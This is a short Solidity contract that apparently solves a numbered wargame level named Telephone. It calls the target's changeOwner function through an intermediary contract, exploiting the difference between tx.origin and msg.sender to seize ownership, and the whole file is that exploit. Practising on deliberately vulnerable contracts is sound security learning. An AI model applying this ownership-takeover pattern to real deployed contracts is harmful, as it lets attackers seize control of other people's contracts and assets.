// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../4Telephone.sol";

contract TelephoneAttack {
    Telephone private telephone;

    constructor() {}

    function attack(address TelephoneAddress) public {
        telephone = Telephone(TelephoneAddress);
        telephone.changeOwner(tx.origin);
    }
}
